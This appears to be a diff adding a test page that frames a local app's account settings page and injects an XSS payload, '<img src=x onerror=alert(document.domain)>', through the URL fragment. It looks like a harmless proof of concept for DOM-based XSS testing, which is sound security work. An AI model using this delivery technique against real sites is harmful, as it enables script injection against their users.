@@ -1,0 +1,18 @@
+<html>
+<body>
+	<h2> This is the first page </h2>
+	<iframe height="600" width="600" id="firstIfrm" src="http://127.0.0.1:8000/myapp/account/settings"></iframe>
+	
+	<script>
+		function sendMessage(msg) {			
+			var target = document.getElementById("firstIfrm");
+			var url = target.src.replace(/#.*/, ''); // clear #fragment
+			target.src = url + "#"+ encodeURIComponent(msg);
+		}
+		
+		document.getElementById('firstIfrm').onload = function() {
+			sendMessage('<img src=x onerror=alert(document.domain)>');			
+		}
+	</script>
+</body>
+</html>
